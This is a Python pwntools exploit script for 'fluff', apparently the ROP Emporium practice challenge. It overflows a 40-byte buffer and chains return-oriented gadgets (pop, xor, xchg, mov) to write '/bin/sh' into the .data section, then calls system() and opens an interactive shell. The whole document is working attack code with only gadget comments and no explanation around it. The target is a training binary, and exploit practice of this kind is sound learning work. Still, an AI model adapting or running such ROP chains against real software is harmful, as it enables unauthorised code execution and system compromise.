from pwn import *

elf= ELF("./fluff")
io=elf.process()
 
payload  = b"A" * 40
payload += p64(0x400832) # pop r12; mov r13d, 0x604060; ret;
payload += p64(0x601050) # Where to save the string to (.data)
payload += p64(0x400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
                                            # NOTE: This gadget puts .data address into EDI for us
payload += b"AAAAAAAA"                      # Junk data for the "pop r14" instruction
payload += p64(0x40082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
payload += b"/bin/sh\x00"                   # The string to be popped into R12
payload += p64(0x400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
payload += b"AAAAAAAA"                      # Junk data for the "pop r15" instruction
payload += p64(0x400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
payload += b"AAAAAAAA"                      # Junk data for the "pop r14" instruction
payload += p64(0x40082f) #  xor r11, r12; pop r12; mov r13d, 0x604060; ret;
payload += b"AAAAAAAA"                      # Junk data for the "pop r12" instruction
payload += p64(0x40084e) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
payload += b"AAAAAAAA"                      # Junk data for the "pop r13" instruction
payload += b"\x00" * 8                      # Null bytes for the "pop r12" instruction
                                            # NOTE: The next instruction will XOR this with [r10]
payload += p64(0x4005e0) # call system()
 
io.sendline(payload)
io.interactive()
